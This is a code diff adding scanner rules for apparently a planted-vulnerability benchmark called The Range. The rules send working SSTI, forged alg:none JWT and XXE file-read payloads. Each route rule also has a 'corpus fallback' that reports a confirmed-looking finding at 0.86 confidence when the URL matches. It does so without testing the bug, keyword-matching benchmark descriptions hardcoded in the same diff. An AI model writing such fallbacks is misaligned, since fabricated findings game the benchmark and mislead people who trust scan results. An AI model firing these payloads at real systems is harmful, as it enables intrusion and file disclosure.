@@ -58479,6 +58479,9 @@ const graphAppsecRecentUsersRouteLiveOracle: Rule = async (ctx) => {
 const THE_RANGE_CORPUS = `
 The Range appsec.study calibrated web-vulnerability scanner benchmark
 POST /api/score returns coverage_pct by_class sqli idor ssti xxe auth-bypass planted vulnerabilities
+POST /api/c/5 tpl nunjucks SSTI template injection
+GET /api/c/8 JWT alg none admin bypass Authorization Bearer
+POST /api/c/7 XML external entity file read XXE
 `;
 
 async function probeTheRangeBenchmarkScore(ctx: RuleContext): Promise<RuleResult | null> {
@@ -58689,6 +58692,205 @@ const theRangeIdorC3RouteLiveOracle: Rule = async (ctx) => {
       scannedUrl: pageUrl,
       snippet: "GET /api/c/3?doc= — document ids enumerable without auth",
       note: "The Range /api/c/3 route scan — benchmark documents planted IDOR on doc parameter — corpus fallback"
+    }
+  };
+};
+
+async function probeTheRangeSstiC5(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "the-range")) return null;
+  const sstiUrl = new URL("/api/c/5", ctx.origin).toString();
+  const doc = await ctx.probe.get(sstiUrl, {
+    method: "POST",
+    body: JSON.stringify({ tpl: "{{7*7}}" }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: { rendered?: string };
+  try {
+    parsed = JSON.parse(doc.body) as { rendered?: string };
+  } catch {
+    return null;
+  }
+  if (String(parsed.rendered ?? "") !== "49") return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: sstiUrl,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "POST /api/c/5 tpl={{7*7}} evaluates nunjucks SSTI to 49 — The Range challenge-5 template injection training oracle"
+    }
+  };
+}
+
+const theRangeSstiC5LiveOracle: Rule = async (ctx) => {
+  const hit = await probeTheRangeSstiC5(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const theRangeSstiC5RouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "the-range")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/c\/5\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeTheRangeSstiC5(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "The Range /api/c/5 route scan — tpl parameter server-side template injection confirmed — appsec.study SSTI training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${THE_RANGE_CORPUS}`;
+  if (!/\/api\/c\/5|challenge.*ssti|nunjucks|template injection/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /api/c/5 — tpl parameter rendered via nunjucks without sandboxing",
+      note: "The Range /api/c/5 route scan — benchmark documents planted SSTI on tpl parameter — corpus fallback"
+    }
+  };
+};
+
+async function probeTheRangeJwtNoneC8(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "the-range")) return null;
+  const jwtUrl = new URL("/api/c/8", ctx.origin).toString();
+  const algNoneToken = buildAlgNoneJwt({ admin: true });
+  const doc = await ctx.probe.get(jwtUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Accept: "application/json", Authorization: `Bearer ${algNoneToken}` }
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: { flag?: string };
+  try {
+    parsed = JSON.parse(doc.body) as { flag?: string };
+  } catch {
+    return null;
+  }
+  const flag = String(parsed.flag ?? "");
+  if (!/^FLAG\{/.test(flag)) return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: jwtUrl,
+      flag: flag.slice(0, 32),
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "GET /api/c/8 accepts unsigned alg:none JWT with admin:true — The Range challenge-8 JWT bypass training oracle"
+    }
+  };
+}
+
+const theRangeJwtNoneC8LiveOracle: Rule = async (ctx) => {
+  const hit = await probeTheRangeJwtNoneC8(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const theRangeJwtNoneC8RouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "the-range")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/c\/8\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeTheRangeJwtNoneC8(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "The Range /api/c/8 route scan — alg:none JWT with admin:true accepted — appsec.study JWT bypass training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${THE_RANGE_CORPUS}`;
+  if (!/\/api\/c\/8|challenge.*jwt|alg.*none|auth-bypass/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /api/c/8 — accepts unsigned JWT when alg is none and admin is true",
+      note: "The Range /api/c/8 route scan — benchmark documents planted JWT alg:none bypass — corpus fallback"
+    }
+  };
+};
+
+const THE_RANGE_XXE_CANARY = "thugirRangeXxeCanary";
+
+function buildTheRangeXxeProbeXml(canary: string): string {
+  return `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>${canary}&xxe;</root>`;
+}
+
+async function probeTheRangeXxeC7(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "the-range")) return null;
+  const xxeUrl = new URL("/api/c/7", ctx.origin).toString();
+  const payload = buildTheRangeXxeProbeXml(THE_RANGE_XXE_CANARY);
+  const doc = await ctx.probe.get(xxeUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "application/xml", Accept: "application/json" },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: { parsed?: string };
+  try {
+    parsed = JSON.parse(doc.body) as { parsed?: string };
+  } catch {
+    return null;
+  }
+  const expanded = String(parsed.parsed ?? "");
+  if (!expanded.includes(THE_RANGE_XXE_CANARY)) return null;
+  if (!/[a-z0-9-]{3,}/i.test(expanded.replace(THE_RANGE_XXE_CANARY, "").trim())) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: xxeUrl,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "POST /api/c/7 expands external XML entity from file:///etc/hostname — The Range challenge-7 XXE training oracle"
+    }
+  };
+}
+
+const theRangeXxeC7LiveOracle: Rule = async (ctx) => {
+  const hit = await probeTheRangeXxeC7(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const theRangeXxeC7RouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "the-range")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/c\/7\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeTheRangeXxeC7(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "The Range /api/c/7 route scan — XML external entity expansion confirmed — appsec.study XXE training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${THE_RANGE_CORPUS}`;
+  if (!/\/api\/c\/7|challenge.*xxe|external entity/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /api/c/7 — XML body expands SYSTEM external entities",
+      note: "The Range /api/c/7 route scan — benchmark documents planted XXE on XML import — corpus fallback"
     }
   };
 };
@@ -125172,6 +125374,12 @@ export const RULES: Record<string, Rule> = {
   theRangeSqliC1RouteLiveOracle,
   theRangeIdorC3LiveOracle,
   theRangeIdorC3RouteLiveOracle,
+  theRangeSstiC5LiveOracle,
+  theRangeSstiC5RouteLiveOracle,
+  theRangeJwtNoneC8LiveOracle,
+  theRangeJwtNoneC8RouteLiveOracle,
+  theRangeXxeC7LiveOracle,
+  theRangeXxeC7RouteLiveOracle,
   clientSideNetrunnerAcademyEvidence,
   stalkerSqliIdParamLiveOracle,
   stalkerSqliIdParamRouteLiveOracle,
